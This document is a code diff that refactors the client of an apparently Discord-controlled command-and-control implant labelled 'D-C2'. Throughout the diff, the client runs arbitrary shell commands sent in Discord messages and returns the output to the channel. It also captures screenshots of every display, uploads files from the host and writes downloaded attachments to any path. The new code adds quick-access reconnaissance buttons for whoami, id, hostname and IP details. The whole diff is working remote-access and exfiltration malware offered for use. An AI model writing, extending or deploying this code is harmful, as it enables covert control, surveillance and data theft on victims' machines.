@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 
@@ -14,7 +15,6 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
-// getTmpDir returns an OS-specific directory for temporary files used by the client.
 func getTmpDir() string {
 	if runtime.GOOS == "windows" {
 		return "C:\\Windows\\Tasks\\"
@@ -23,7 +23,63 @@ func getTmpDir() string {
 	}
 }
 
-// handler processes control messages from Discord and executes the requested action on the client.
+func handleScreenshot(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
+	n := screenshot.NumActiveDisplays()
+	for i := 0; i < n; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+		img, _ := screenshot.CaptureRect(bounds)
+
+		fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
+		file, _ := os.Create(fileName)
+		png.Encode(file, img)
+		defer file.Close()
+
+		f, _ := os.Open(fileName)
+		defer f.Close()
+		fileStruct := &discordgo.File{Name: fileName, Reader: f}
+		fileArray := []*discordgo.File{fileStruct}
+		s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
+	}
+}
+
+func runCommandString(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, cmdStr string) {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", cmdStr)
+	} else {
+		cmd = exec.Command("/bin/bash", "-c", cmdStr)
+	}
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		out = append(out, 0x0a)
+		out = append(out, []byte(err.Error())...)
+	}
+
+	outStr := string(out)
+	if len(outStr) == 0 {
+		s.ChannelMessageSendReply(channelID, "```bash\n<no output>\n```", ref)
+	} else {
+		runes := []rune(outStr)
+		const maxChunk = 1800
+		for start := 0; start < len(runes); start += maxChunk {
+			end := start + maxChunk
+			if end > len(runes) {
+				end = len(runes)
+			}
+			chunk := string(runes[start:end])
+			var resp strings.Builder
+			resp.WriteString("```bash\n")
+			resp.WriteString(chunk)
+			resp.WriteString("\n```")
+			if start == 0 && ref != nil {
+				s.ChannelMessageSendReply(channelID, resp.String(), ref)
+			} else {
+				s.ChannelMessageSend(channelID, resp.String())
+			}
+		}
+	}
+}
+
 func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
 		return
@@ -33,83 +89,156 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	flag := 0
 
 	if strings.HasPrefix(m.Content, "🏃‍♂️") {
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
-		} else {
-			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
+		cmdStr := strings.TrimSpace(strings.TrimPrefix(m.Content, "🏃‍♂️"))
+		if cmdStr == "" {
+			s.ChannelMessageSendReply(m.ChannelID, "Usage: 🏃‍♂️ <command>", m.Reference())
+			goto done
 		}
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			out = append(out, 0x0a)
-			out = append(out, []byte(err.Error())...)
+		runCommandString(s, m.ChannelID, m.Reference(), cmdStr)
+		flag = 1
+	} else if m.Content == "help" {
+		help := "**D‑C2 Quick Help**\n\n" +
+			"Use these simple controls in this device channel:\n\n" +
+			"**Screenshots**\n" +
+			"Use `/screenshot` or click the Screenshot button to capture the screen.\n\n" +
+			"**Quick info**\n" +
+			"Buttons for `whoami`, `id`, `hostname` and IP info run suitable commands on this OS:\n" +
+			"- Windows: whoami, hostname, ipconfig\n" +
+			"- Linux/macOS: whoami, id, hostname, ip addr\n\n" +
+			"**More controls**\n" +
+			"Advanced commands are available via slash commands (see `/help`).\n\n" +
+			"Send `help` or `/help` anytime to show this help again."
+		components := []discordgo.MessageComponent{
+			discordgo.ActionsRow{
+				Components: []discordgo.MessageComponent{
+					discordgo.Button{
+						CustomID: "d2c_screenshot",
+						Label:    "Screenshot",
+						Emoji:    discordgo.ComponentEmoji{Name: "📸"},
+						Style:    discordgo.PrimaryButton,
+					},
+				},
+			},
+			discordgo.ActionsRow{
+				Components: []discordgo.MessageComponent{
+					discordgo.Button{
+						CustomID: "d2c_q_whoami",
+						Label:    "whoami",
+						Emoji:    discordgo.ComponentEmoji{Name: "🙍"},
+						Style:    discordgo.SecondaryButton,
+					},
+					discordgo.Button{
+						CustomID: "d2c_q_id",
+						Label:    "id",
+						Emoji:    discordgo.ComponentEmoji{Name: "🆔"},
+						Style:    discordgo.SecondaryButton,
+					},
+					discordgo.Button{
+						CustomID: "d2c_q_hostname",
+						Label:    "hostname",
+						Emoji:    discordgo.ComponentEmoji{Name: "💻"},
+						Style:    discordgo.SecondaryButton,
+					},
+					discordgo.Button{
+						CustomID: "d2c_q_ip",
+						Label:    "ip info",
+						Emoji:    discordgo.ComponentEmoji{Name: "🌐"},
+						Style:    discordgo.SecondaryButton,
+					},
+				},
+			},
+			discordgo.ActionsRow{
+				Components: []discordgo.MessageComponent{
+					discordgo.Button{
+						CustomID: "d2c_q_cwd",
+						Label:    "cwd",
+						Emoji:    discordgo.ComponentEmoji{Name: "📂"},
+						Style:    discordgo.SecondaryButton,
+					},
+				},
+			},
 		}
-
-		if len(out) > 2000-13 {
-			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
-			f.Write(out)
-			fileName := f.Name()
-			f.Close()
-
-			f, _ = os.Open(fileName)
-			defer f.Close()
-			fileStruct := &discordgo.File{Name: fileName, Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
-		} else {
-			var resp strings.Builder
-			resp.WriteString("```bash\n")
-			resp.WriteString(string(out) + "\n")
-			resp.WriteString("```")
-			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
-		}
+		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
+			Content:    help,
+			Reference:  m.Reference(),
+			Components: components,
+		})
 		flag = 1
 	} else if m.Content == "📸" {
-		n := screenshot.NumActiveDisplays()
-		for i := 0; i < n; i++ {
-			bounds := screenshot.GetDisplayBounds(i)
-			img, _ := screenshot.CaptureRect(bounds)
-
-			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
-			file, _ := os.Create(fileName)
-			png.Encode(file, img)
-			defer file.Close()
-
-			f, _ := os.Open(fileName)
-			defer f.Close()
-			fileStruct := &discordgo.File{Name: fileName, Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
-		}
+		handleScreenshot(s, m.ChannelID, m.Reference())
 		flag = 1
 	} else if strings.HasPrefix(m.Content, "👇") {
-		fileName := m.Content[5:len(m.Content)]
-		f, _ := os.Open(fileName)
-		fi, _ := f.Stat()
-		defer f.Close()
-		if fi.Size() < 8388608 {
-			fileStruct := &discordgo.File{Name: fileName, Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
-			flag = 1
+		parts := strings.Fields(m.Content)
+		if len(parts) < 2 {
+			s.ChannelMessageSendReply(m.ChannelID, "Usage: 👇 <path>", m.Reference())
+			goto done
+		}
+		fileName := strings.TrimSpace(parts[1])
+		if strings.HasPrefix(fileName, "~/") {
+			if home, err := os.UserHomeDir(); err == nil {
+				fileName = home + string(os.PathSeparator) + fileName[2:]
+			}
+		}
+		f, err := os.Open(fileName)
+		if err != nil {
+			s.ChannelMessageSendReply(m.ChannelID, "Cannot open file: "+fileName+" ("+err.Error()+")", m.Reference())
 		} else {
-			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
+			defer f.Close()
+			fi, err := f.Stat()
+			if err != nil {
+				s.ChannelMessageSendReply(m.ChannelID, "Cannot stat file: "+fileName+" ("+err.Error()+")", m.Reference())
+			} else {
+				if fi.Size() < 8388608 {
+					fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
+					fileArray := []*discordgo.File{fileStruct}
+					_, err = s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
+						Files:     fileArray,
+						Reference: m.Reference(),
+					})
+					if err != nil {
+						s.ChannelMessageSendReply(m.ChannelID, "Upload failed: "+err.Error(), m.Reference())
+					} else {
+						flag = 1
+					}
+				} else {
+					s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
+				}
+			}
 		}
 	} else if strings.HasPrefix(m.Content, "☝️") {
-		path := m.Content[7:len(m.Content)]
-		if len(m.Attachments) > 0 {
-			out, _ := os.Create(path)
-			defer out.Close()
-			resp, _ := http.Get(m.Attachments[0].URL)
-			defer resp.Body.Close()
-			io.Copy(out, resp.Body)
-			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
+		parts := strings.Fields(m.Content)
+		if len(parts) < 2 {
+			s.ChannelMessageSendReply(m.ChannelID, "Usage: ☝️ <path> *attach", m.Reference())
+			goto done
 		}
-		flag = 1
+		path := strings.TrimSpace(parts[1])
+		if strings.HasPrefix(path, "~/") {
+			if home, err := os.UserHomeDir(); err == nil {
+				path = home + string(os.PathSeparator) + path[2:]
+			}
+		}
+		if len(m.Attachments) > 0 {
+			out, err := os.Create(path)
+			if err != nil {
+				s.ChannelMessageSendReply(m.ChannelID, "Cannot create file: "+path, m.Reference())
+			} else {
+				defer out.Close()
+				resp, err := http.Get(m.Attachments[0].URL)
+				if err != nil {
+					s.ChannelMessageSendReply(m.ChannelID, "Download failed: "+err.Error(), m.Reference())
+				} else {
+					defer resp.Body.Close()
+					_, _ = io.Copy(out, resp.Body)
+					s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
+					flag = 1
+				}
+			}
+		}
 	} else if m.Content == "💀" {
 		flag = 2
 	}
 
+done:
 	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
 	if flag > 0 {
 		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
